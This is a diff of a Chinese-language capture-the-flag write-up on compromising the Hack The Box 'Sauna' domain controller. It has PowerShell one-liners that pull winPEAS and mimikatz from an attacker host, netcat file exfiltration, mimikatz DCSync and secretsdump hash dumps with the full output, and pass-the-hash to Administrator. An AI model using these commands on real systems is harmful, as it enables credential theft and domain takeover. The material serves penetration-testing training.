@@ -113,6 +113,8 @@ Nmap done: 1 IP address (1 host up) scanned in 121.12 seconds
 
 ```
 
+有DNS，kerberos和ldap，显然这是一台DC服务器。
+
 枚举域名
 ```
 ┌──(root💀kali)-[~/htb/Sauna]
@@ -262,6 +264,7 @@ Session completed
 
 ```
 
+# foodhold
 拿到一个用户凭证：```fsmith:Thestrokes23```
 
 使用evil-winrm登录，拿到foodhold和user.txt
@@ -283,33 +286,291 @@ egotisticalbank\fsmith
 
 # 提权
 
+传winpeas和nc到靶机：
+```powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.3:8000/winPEASx64.exe','C:\Users\FSmith\Desktop\winPEASx64.exe')"```
+
+执行winpea,重定向到o.txt：
+
+&{C:\Users\FSmith\Desktop\winPEASx64.exe} > o.txt
+
+
+## poweshell利用nc.exe传送文件
+
+
+接收
+```nc -nlvp 4444 > o.txt```
+
+传送
+```Get-Content  o.txt  | .\nc.exe -w 3 10.10.16.3 4444 | tee test.log```
+
+发现一个用户密码
+```
+???????????? Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  EGOTISTICALBANK
+    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
+    DefaultPassword               :  Moneymakestheworldgoround!
+
+```
+
+
+查看靶机的用户
+```
+*Evil-WinRM* PS C:\> net users
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            FSmith                   Guest
+HSmith                   krbtgt                   svc_loanmgr
+The command completed with one or more errors.
+
+```
+
+用evil-winrm登录到```svc_loanmgr```，查看用户信息信息
+```
+*Evil-WinRM* PS C:\> net users svc_loanmgr
+User name                    svc_loanmgr
+Full Name                    L Manager
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/24/2020 3:48:31 PM
+Password expires             Never
+Password changeable          1/25/2020 3:48:31 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+
+```
+
+看到```svc_loanmgr```在```Remote Management Use```组
+
+查看这个组的解释
+```
+*Evil-WinRM* PS C:\Users\FSmith\Desktop> net localgroup "Remote Management Users"
+Alias name     Remote Management Users
+Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
+
+Members
+
+-------------------------------------------------------------------------------
+FSmith
+svc_loanmgr
+The command completed successfully.
+
+```
+
+好像就是一个远程访问组。
+
+我们尝试使用```DCSync```攻击尝试窃取用户哈希
+
+关于```DCSync```，[hacktricks](https://book.hacktricks.xyz/windows/active-directory-methodology/dcsync#dcsync)上是这样解释的：
+
+1. The DCSync attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information using the Directory Replication Service Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.
+
+2. By default only Domain Admins, Enterprise Admins, Administrators, and Domain Controllers groups have the required privileges.
+
+3. If any account passwords are stored with reversible encryption, an option is available in Mimikatz to return the password in clear text
+
+默认有权限执行DCSync的用户组是：Domain Admins, Enterprise Admins, Administrators, and Domain Controllers 
+
+
+把mimikatz.exe从kali传到靶机：
+
+```powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.3:8000/mimikatz.exe','C:\Users\svc_loanmgr\Documents\mimikatz.exe')"```
+
+
+执行下面命令触发DC同步
+
+```mimikatz.exe privilege::debug "lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /all /csv" exit```
+
+可以看见导出了用户的哈希
+```
+*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> ./mimikatz.exe privilege::debug "lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /all /csv" exit
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # privilege::debug
+ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
+
+mimikatz(commandline) # lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /all /csv
+[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain
+[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
+[DC] Exporting domain 'EGOTISTICAL-BANK.LOCAL'
+502     krbtgt  4a8899428cad97676ff802229e466e2c        514
+1103    HSmith  58a52d36c84fb7f5f1beab9a201db1dd        66048
+1000    SAUNA$  230699e71e07d687981fc0685082b5cc        532480
+500     Administrator   823452073d75b9d1cf70ebdf86c7f98e        66048
+1105    FSmith  58a52d36c84fb7f5f1beab9a201db1dd        4260352
+1108    svc_loanmgr     9cb31797c39a9b170b04058ba2bba48c        66048
+
+mimikatz(commandline) # exit
+Bye!
+
+```
+
+利用evil-winrm,使用哈希密码直接登录到```Administrator```（pass-the-hash）
 ```
 ┌──(root💀kali)-[~/htb/Sauna]
-└─# smbmap -u "fsmith" -p "Thestrokes23" -H 10.10.10.175 
-[+] IP: 10.10.10.175:445        Name: 10.10.10.175                                      
-        Disk                                                    Permissions     Comment
-        ----                                                    -----------     -------
-        ADMIN$                                                  NO ACCESS       Remote Admin
-        C$                                                      NO ACCESS       Default share
-        IPC$                                                    READ ONLY       Remote IPC
-        NETLOGON                                                READ ONLY       Logon server share 
-        print$                                                  READ ONLY       Printer Drivers
-        RICOH Aficio SP 8300DN PCL 6                            NO ACCESS       We cant print money
-        SYSVOL                                                  READ ONLY       Logon server share 
+└─# evil-winrm -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175
+
+Evil-WinRM shell v3.2
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+egotisticalbank\administrator
 
 ```
 
-smbmap -u "fsmith" -p "Thestrokes23" -H 10.10.10.175 
+# 总结
+通过web页面展示的信息，我们猜测到了一个用户名
+使用```GetNPUsers.py```尝试向kerberos请求不需要预认证的票据，我们因此拿到了foodhold
+使用winpeas，我们枚举到了另外一个用户的明文凭证，因此我们可以提权到```svc_loanmgr```
+利用DCSync拿到管理员的哈希密码，从而提权到administrator
 
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.7:8000/winPEASx64.exe','C:\Users\FSmith\Desktop\winPEASx64.exe')"
 
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.7:8000/nc.exe','C:\Users\FSmith\Desktop\nc.exe')"
+# 补充
+
+## secretsdump.py
+拿到```svc_loanmgr```的凭证以后使用secretsdump.py也可以爆出其他用户的哈希密码：
+```
+┌──(root💀kali)-[~/htb/Sauna]
+└─# python3 /usr/share/doc/python3-impacket/examples/secretsdump.py EGOTISTICALBANK/svc_loanmgr:Moneymakestheworldgoround\\!@10.10.10.175
+Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:230699e71e07d687981fc0685082b5cc:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
+Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
+Administrator:des-cbc-md5:fb8f321c64cea87f
+krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
+krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
+krbtgt:des-cbc-md5:c170d5dc3edfc1d9
+EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
+EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
+EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
+EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
+EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
+EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
+SAUNA$:aes256-cts-hmac-sha1-96:8dccc32df17c3189f01f7702e6198f9a01199229d04420d830bca8dc8a1b483e
+SAUNA$:aes128-cts-hmac-sha1-96:a2927c8ea3e312d65894d9b1e508931f
+SAUNA$:des-cbc-md5:7c2c156d022c0131
+[*] Cleaning up... 
+```
+
+## 如何知道本账号是否有权限使用DCSync？
+
+把[PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit)下载到本地
 
 
-&{C:\Users\FSmith\Desktop\nc.exe 10.10.14.7 9995} < o.txt
+登录到靶机
+```
+┌──(root💀kali)-[~/htb/Sauna]
+└─# evil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' -s '/root/PowerSploit/Recon'
 
-smbclient -U 'fsmith%Thestrokes23' -L  //10.10.10.175/SYSVOL
+```
 
-smbclient -U 'fsmith%Thestrokes23' -N \\\\10.10.10.175\\SYSVOL
+引入PowerView.ps1
+```*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> PowerView.ps1```
 
-smbclient -U 'fsmith%Thestrokes23' \\\\10.10.10.175\\SYSVOL
+
+检查svc_loanmgr和Fsmith的域权限
+```
+*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> Get-ObjectAcl -DistinguishedName "dc=EGOTISTICAL-BANK,dc=LOCAL" -ResolveGUIDs | ? {$_.IdentityReference -match "svc_loanmgr|Fsmith"}
+
+
+InheritedObjectType   : All
+ObjectDN              : DC=EGOTISTICAL-BANK,DC=LOCAL
+ObjectType            : All
+IdentityReference     : EGOTISTICALBANK\FSmith
+IsInherited           : False
+ActiveDirectoryRights : ReadProperty, GenericExecute
+PropagationFlags      : None
+ObjectFlags           : None
+InheritanceFlags      : None
+InheritanceType       : None
+AccessControlType     : Allow
+ObjectSID             : S-1-5-21-2966785786-3096785034-1186376766
+
+/usr/lib/ruby/vendor_ruby/net/ntlm/client/session.rb:39: warning: constant OpenSSL::Cipher::Cipher is deprecated
+/usr/lib/ruby/vendor_ruby/net/ntlm/client/session.rb:128: warning: constant OpenSSL::Cipher::Cipher is deprecated
+/usr/lib/ruby/vendor_ruby/net/ntlm/client/session.rb:138: warning: constant OpenSSL::Cipher::Cipher is deprecated
+InheritedObjectType   : All
+ObjectDN              : DC=EGOTISTICAL-BANK,DC=LOCAL
+ObjectType            : All
+IdentityReference     : EGOTISTICALBANK\svc_loanmgr
+IsInherited           : False
+ActiveDirectoryRights : ReadProperty, GenericExecute
+PropagationFlags      : None
+ObjectFlags           : None
+InheritanceFlags      : None
+InheritanceType       : None
+AccessControlType     : Allow
+ObjectSID             : S-1-5-21-2966785786-3096785034-1186376766
+
+InheritedObjectType   : All
+ObjectDN              : DC=EGOTISTICAL-BANK,DC=LOCAL
+ObjectType            : DS-Replication-Get-Changes
+IdentityReference     : EGOTISTICALBANK\svc_loanmgr
+IsInherited           : False
+ActiveDirectoryRights : ExtendedRight
+PropagationFlags      : None
+ObjectFlags           : ObjectAceTypePresent
+InheritanceFlags      : None
+InheritanceType       : None
+AccessControlType     : Allow
+ObjectSID             : S-1-5-21-2966785786-3096785034-1186376766
+
+InheritedObjectType   : All
+ObjectDN              : DC=EGOTISTICAL-BANK,DC=LOCAL
+ObjectType            : DS-Replication-Get-Changes-All
+IdentityReference     : EGOTISTICALBANK\svc_loanmgr
+IsInherited           : False
+ActiveDirectoryRights : ExtendedRight
+PropagationFlags      : None
+ObjectFlags           : ObjectAceTypePresent
+InheritanceFlags      : None
+InheritanceType       : None
+AccessControlType     : Allow
+ObjectSID             : S-1-5-21-2966785786-3096785034-1186376766
+```
+
+留意ObjectType里显示svc_loanmgr拥有``` DS-Replication-Get-Changes```和```DS-Replication-Get-Changes-All```
+表明用户可以使用DCSync，参考[这篇文章](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
